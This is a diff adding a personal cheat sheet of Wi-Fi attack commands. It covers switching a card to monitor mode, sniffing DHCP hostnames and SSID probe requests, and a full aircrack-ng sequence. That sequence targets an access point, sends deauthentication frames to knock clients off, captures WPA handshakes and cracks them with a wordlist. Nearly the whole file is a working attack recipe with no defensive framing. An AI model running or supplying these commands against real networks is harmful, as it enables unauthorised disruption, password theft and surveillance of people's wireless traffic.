@@ -1,0 +1,37 @@
+##############################
+
+
+service NetworkManager stop
+ifconfig wlp1s0 down
+iwconfig wlp1s0 mode monitor
+ifconfig wlp1s0 up
+
+
+iwconfig wlp1s0 mode managed
+service NetworkManager restart
+
+
+sudo tcpdump -i wlp1s0 -w filename not ether host b8:08:cf:32:be:6c
+
+tshark -ni wlp1s0 -Y "bootp.option.type==53" -T fields -e bootp.option.hostname -e eth.src_resolved
+
+wlan.fc.type_subtype == 0x0004
+# to get SSID probe requests
+
+************************
+airmon-ng
+airmon-ng start [interface name]
+airodump-ng wlan0mon
+airodump-ng wlan0mon -c 6 # only channel 6
+airodump-ng wlan0mon -c 6 --bssid aa:aa:aa:aa:ff:33 # only this ap on this channel
+airodump-ng wlan0mon -c 6 --bssid aa:aa:aa:aa:ff:33 -w capture-file
+aireplay-ng --deauth 100 -a [ap mac] wlan0mon
+aircrack-ng -w words [cap file]
+
+aircrack-ng will list out the APs in the cap file and, if wpa, will list num of handsakes; need 1
+pipe it through tee [file] and select some random ap to capture text list of aps, then:
+grep handshake foo1 | grep -v "0 handshake"
+
+to find if there are any to crack
+
+
